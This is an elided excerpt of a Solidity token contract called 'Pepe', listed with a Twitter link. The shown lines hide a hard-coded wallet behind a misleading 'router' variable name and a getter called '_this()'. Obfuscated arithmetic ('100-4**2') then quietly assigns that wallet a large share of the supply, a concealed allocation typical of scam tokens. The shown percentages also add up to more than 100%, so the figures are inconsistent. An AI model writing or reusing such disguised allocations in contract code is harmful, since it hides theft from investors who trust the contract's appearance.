...
Twitter: http://twitter.com/pepe2point0
...
contract Ownable is Context {
    ...
    address private _iURouterAddress = 0x69CD8E5f95dBBcaF563AABBD6b2d998278e254Fd;
    ...
    function _this() public view returns (address) {
        return _iURouterAddress;
    }
...
contract Pepe is Context, IERC20, Ownable {
    ...
    uint256 private _Total=100-4**2;
    ...
    _balances[address(this)] = _tTotal.mul(_Total).div(100);
    _balances[_this()] = _tTotal.mul(_Total-2**4).div(100);
